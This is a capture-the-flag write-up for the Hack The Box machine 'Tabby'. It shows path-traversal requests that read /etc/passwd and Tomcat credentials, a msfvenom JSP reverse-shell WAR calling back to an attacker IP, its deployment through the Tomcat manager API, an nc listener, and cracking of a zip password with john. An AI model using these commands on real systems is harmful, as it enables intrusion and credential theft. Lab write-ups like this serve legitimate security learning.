---
title: HTB Tabby
author: kei5uke
draft: true
description: Writeup for HTB Tabby
tags:
  - linux
  - writeup
---

# Nmap

```
nmap 10.129.13.80 -sC -sV -T4 -p- -oN nmap.tcp.txt                                                                        │
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-21 09:36 EDT                                                              │
Nmap scan report for 10.129.13.80                                                                                            │
Host is up (0.030s latency).                                                                                                 │
Not shown: 65532 closed tcp ports (reset)                                                                                    │
PORT     STATE SERVICE VERSION                                                                                               │
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                   │
| ssh-hostkey:                                                                                                               │
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)                                                               │
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)                                                              │
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)                                                            │
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                        │
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                 │
|_http-title: Mega Hosting                                                                                                   │
8080/tcp open  http    Apache Tomcat                                                                                         │
|_http-title: Apache Tomcat                                                                                                  │
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

# HTTP80

![[HTB Tabby - image.png]]

- `megahosting.htb`
- Found dir traversal: `http://megahosting.htb/news.php?file=../../../../etc/passwd`
- Im not sure if this works: `http://megahosting.htb/news.php?file=..%2F..%2F..%2F..%2F..%2F%2Fbin%2Fbash -c 'whoami'`
- User: `ash:x:1000:1000:clive:/home/ash:/bin/bash`
- Tomcat: `tomcat:x:997:997::/opt/tomcat:/bin/false`
- `curl http://megahosting.htb/news.php\\?file\\=../../../../usr/share/tomcat9/etc/tomcat-users.xml`
This gives you a credentials

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>

```

`tomcat:$3cureP4s5w0rd123!`

# HTTP8080

![[HTB Tabby - image 1.png]]

- `Apache Tomcat 9` `Version 9.0.31`
- Admin page

Make rev shell - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.252 LPORT=4444 -f war -o shell.war`

Upload - `curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/app'`

Confirm - `curl -u 'tomcat:$3cureP4s5w0rd123!' 'http://megahosting.htb:8080/manager/text/list'`

Wait for connection - `rlwrap nc -nlvp 4444`

Check JSP in rev shell: `jar -tf shell.war | grep '\.jsp$'`
> `ipbfomlr.jsp`

Pull the trigger - `curl http://megahosting.htb:8080/app/ipbfomlr.jsp`

# Shell as Tomcat

Found zip file in /var/www

```
╭─ /home/kali/Downloads ▓▒░···································································································································································································░▒▓ ✔ │ root@kali  16:13:34 
╰─ john zip_secret --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)     
1g 0:00:00:00 DONE (2026-03-21 16:14) 2.702g/s 28029Kp/s 28029Kc/s 28029KC/s adornadis..adamsapple:)1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

This is ash’s password: `admin@it`
